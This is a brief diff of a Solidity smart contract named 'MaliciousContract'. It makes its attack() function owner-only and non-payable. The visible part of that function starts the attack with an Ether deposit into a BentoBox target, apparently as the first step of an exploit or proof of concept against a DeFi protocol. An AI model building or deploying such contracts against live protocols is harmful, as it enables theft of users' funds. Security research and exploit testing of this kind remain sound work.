@@ -22,7 +22,9 @@ contract MaliciousContract {
     // Optional: receive function to accept Ether
     receive() external payable {}
 
-    function attack(uint256 _amount) external payable {
+    function attack(uint256 _amount) external {
+        require(msg.sender == owner, "Not the owner");
+        
         // Initial deposit to BentoBox
         target.deposit{value: _amount}(IERC20(address(0)), address(this), address(this), _amount, 0);
         
